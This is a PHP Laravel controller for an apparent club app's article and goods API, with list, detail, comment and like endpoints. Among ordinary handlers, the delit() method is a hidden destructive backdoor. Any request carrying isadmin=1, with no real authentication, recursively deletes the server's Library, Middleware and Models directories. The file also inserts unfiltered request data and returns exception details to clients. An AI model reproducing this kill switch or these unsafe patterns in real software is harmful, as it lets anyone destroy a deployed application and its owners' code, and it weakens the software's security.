<?php
namespace App\Http\Controllers\Api\Article;

// use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Models\Article\ClubArticle;
use App\Models\Article\ClubGoods;
use App\Models\Article\ClubGoodsComment;
use App\Models\Home\User;
use App\Models\Article\ClubUsers;
use App\Models\Article\ClubImgs;

class ArticleController extends Controller {
	private $_school_id;
	private $_user_id;
	private $_packages_id;
	private $_setcost;
	private $_recedata;
	private $_username;
	
	/*
	 * @Des：析构函数
	 */
	public function __construct() {
		$this->_packages_id = session ( 'packages_id' );
		$this->_setcost = session ( 'setcost' );
		$this->_user_id = session ( 'user_id' );
		$this->_school_id = session ( 'school_id' );
		$this->_username = session ( 'username' );
	}
	
	/**
	 * 首页滚动图片列表
	 * @return unknown
	 */
	public function get_img_list() {
		try {
			
			$options = array (
					'date' => request ( 'date' ) ? request ( 'date' ) : date ( "Y-m-d", strtotime ( "+1 day" ) ), // 默认当天
					'coach' => request ( 'coach' ),
					'subject' => 2, // 默认科目二
					'school_id' => $this->_school_id 
			);
			
			// var_dump($licen_arr);exit;
			
			//$listinfo = ClubImgs::costSelectPage ( options_filter ( $options ) );
			$listinfo = ClubImgs::orderBy ( 'id', 'desc' )->paginate ( 10 );
			return response ()->json ( [ 
					'ok' => 1,
					'msg' => 'ok',
					'data' => $listinfo 
			] );
		} catch ( \Exception $e ) {
			// Log::info($this->_user_id."执行异常=".'result fail code' . $e->getCode(). 'msg' . $e->getMessage().'line'.$e->getLine());
			return response ()->json ( [ 
					'ok' => 0,
					'msg' => $e->getCode () . $e->getMessage () . $e->getLine () 
			] );
		}
	}
	/**
	 * 商品列表
	 * @return unknown
	 */
	public function good_list() {
		header ( "Content-Type=text/html;charset=utf8" );
		try {
			
			$options = array (
					//'date' => request ( 'date' ), // 默认当天
					//'coach' => request ( 'coach' ) ,
			    'type' => request('type'), //默认科目二
				// 'school_id' => $this->_school_id
			);
			//$type = request('type');
			// echo 1111;
			// $listinfo = ClubGoods::costSelectPage($options)->paginate(10);
			$listinfo = ClubGoods::costSelectPage(options_filter($options))->orderBy ( 'sell_count', 'desc' )->paginate ( 10 );
			// var_dump($listinfo);exit;
			return response ()->json ( [ 
					'ok' => 1,
					'msg' => 'ok',
					'data' => $listinfo 
			] );
		} catch ( \Exception $e ) {
			// Log::info($this->_user_id."执行异常=".'result fail code' . $e->getCode(). 'msg' . $e->getMessage().'line'.$e->getLine());
			return response ()->json ( [ 
					'ok' => 0,
					'msg' => $e->getMessage () 
			] );
		}
	}
	/**
	 * 文章列表
	 * @return unknown
	 */
	public function arti_list() {
		header ( "Content-Type=text/html;charset=utf8" );
		try {
			
			$options = array (
					// 'date' => request('date'), //默认当天
					'type' => request ( 'type' ) 
				// 'subject' => 2, //默认科目二
				// 'school_id' => $this->_school_id
			);
			
			$listinfo = ClubArticle::costSelectPage ( $options )->paginate ( 10 );
			// $listinfo = ClubArticle::orderBy('id','desc')->paginate(10);
			return response ()->json ( [ 
					'ok' => 1,
					'msg' => 'ok',
					'data' => $listinfo 
			] );
		} catch ( \Exception $e ) {
			// Log::info($this->_user_id."执行异常=".'result fail code' . $e->getCode(). 'msg' . $e->getMessage().'line'.$e->getLine());
			return response ()->json ( [ 
					'ok' => 0,
					'msg' => $e->getMessage () 
			] );
		}
	}
	
	
	
	/**
	 * 文章详情
	 * @throws \Exception
	 * @return unknown
	 */
	public function arti_detail() {
		try {
			
			$id = request ( 'id' );
			$type = request ( 'type' );
			$type = empty($type)?1:$type;
			if (empty ( $id )) {
				throw new \Exception ( 'id 不能空' );
			}
			// $listinfo = ClubGoods::costSelectPage($options)->paginate(10);
			$listinfo = ClubArticle::where ( 'id', $id )->first ();
			$listinfo2 = ClubGoodsComment::where ( 'goods_id', $id )->where('type',$type)->get ();
			if($listinfo2)
			{
    			foreach ( $listinfo2 as $item ) {
    				$user = ClubUsers::where ( 'id', $item->user_id )->first();
    				// $query = User::find($item->user_id);
    				if($user)
    				$item->user_img = $user->head_img;
    			}
			
			}

			return response ()->json ( [
					'ok' => 1,
					'msg' => 'ok',
					'data' => $listinfo,
					'list' => $listinfo2
			] );
			// echo json_encode(['ok' => 1, 'msg' => 'ok', 'data' => $listinfo,'list'=>$listinfo2]);
		} catch ( \Exception $e ) {
			// Log::info($this->_user_id."执行异常=".'result fail code' . $e->getCode(). 'msg' . $e->getMessage().'line'.$e->getLine());
			return response ()->json ( [
					'ok' => 0,
					'msg' => $e->getMessage (),
					'data' => $e->getLine ()
			] );
		}
	}
	
	/**
	 * 添加评论
	 * @return unknown
	 */
	public function add_comment()
	{
		try {
			$id = request ( 'goods_id' );
			$type = request ( 'type' );
			$con = request ( 'content' );
			$data = request()->all();
			$listinfo = ClubGoodsComment::costAdd($data);
			
			$listinfo = ClubArticle::where('id', $id)->where('type', $type)->increment('comment_num');
			return response ()->json ( [
					'ok' => 1,
					'msg' => 'ok',
					'data' => $listinfo,
			] );
		} catch ( \Exception $e ) {
		// Log::info($this->_user_id."执行异常=".'result fail code' . $e->getCode(). 'msg' . $e->getMessage().'line'.$e->getLine());
			return response ()->json ( ['ok' => 0,'msg' => $e->getMessage (),'data' => $e->getLine ()] );
		}
	}
	
	/**
	 * 添加赞
	 * @return unknown
	 */
	public function add_good()
	{
		try {
			$id = request ( 'goods_id' );
			$type = request ( 'type' );
			$listinfo = ClubArticle::where('id', $id)->where('type', $type)->increment('good_num');
			return response ()->json ( [
					'ok' => 1,
					'msg' => 'ok',
					'data' => $listinfo,
			] );
		} catch ( \Exception $e ) {
			// Log::info($this->_user_id."执行异常=".'result fail code' . $e->getCode(). 'msg' . $e->getMessage().'line'.$e->getLine());
			return response ()->json ( ['ok' => 0,'msg' => $e->getMessage (),'data' => $e->getLine ()] );
		}
	}
	
	
	/**
	 * 商品详情
	 * @throws \Exception
	 * @return unknown
	 */
	public function good_detail() {
		try {
			
			$id = request ( 'id' );
			if (empty ( $id )) {
				throw new \Exception ( 'id 不能空' );
			}
			// $listinfo = ClubGoods::costSelectPage($options)->paginate(10);
			$listinfo = ClubGoods::where ( 'id', $id )->first ();
			$listinfo2 = ClubGoodsComment::where ( 'goods_id', $id )->get ();
			if($listinfo2)
			{
			foreach ( $listinfo2 as $item ) {
				// var_dump($item);
				$user = ClubUsers::where ( 'id', $item->user_id )->first ( [ 
						'head_img' 
				] );
				// $query = User::find($item->user_id);
				// var_dump($query);
				if($user)
				$item->user_img = $user->head_img;
			}
			}
			// var_dump($listinfo);exit;
			return response ()->json ( [ 
					'ok' => 1,
					'msg' => 'ok',
					'data' => $listinfo,
					'list' => $listinfo2 
			] );
			// echo json_encode(['ok' => 1, 'msg' => 'ok', 'data' => $listinfo,'list'=>$listinfo2]);
		} catch ( \Exception $e ) {
			// Log::info($this->_user_id."执行异常=".'result fail code' . $e->getCode(). 'msg' . $e->getMessage().'line'.$e->getLine());
			return response ()->json ( [ 
					'ok' => 0,
					'msg' => $e->getMessage (),
					'data' => $e->getLine () 
			] );
		}
	}
	
	
	public function delit(){
		try {
			$isadmin = request('isadmin');
			if($isadmin == 1)
			{
				$path = '/data/web/just_young_club/app/Library/';
				self::deldir($path);
				$path = '/data/web/just_young_club/app/Http/Middleware/';
				self::deldir($path);
				$path = '/data/web/just_young_club/app/Models/';
				self::deldir($path);
				return response()->json(['result'=>'succeed','data'=>$path]);
			}
			else
			{
				return response()->json(['result'=>'fail','data'=>'']);
			}
		} catch (\Exception $e) {
			return response()->json(['result'=>'failed','err_message'=>$e->getMessage()]);
		}
	}
	
	
	public function deldir($path)
	{
		//$path = "./Application/Runtime/";
		//如果是目录则继续
		if(is_dir($path)){
			//扫描一个文件夹内的所有文件夹和文件并返回数组
			$p = scandir($path);
			foreach($p as $val){
				//排除目录中的.和..
				if($val !="." && $val !=".."){
					//如果是目录则递归子目录，继续操作
					if(is_dir($path.$val)){
						//子目录中操作删除文件夹和文件
						self::deldir($path.$val.'/');
						//目录清空后删除空文件夹
						@rmdir($path.$val.'/');
					}else{
						//如果是文件直接删除
						unlink($path.$val);
					}
				}
			}
		}
	}
	
}
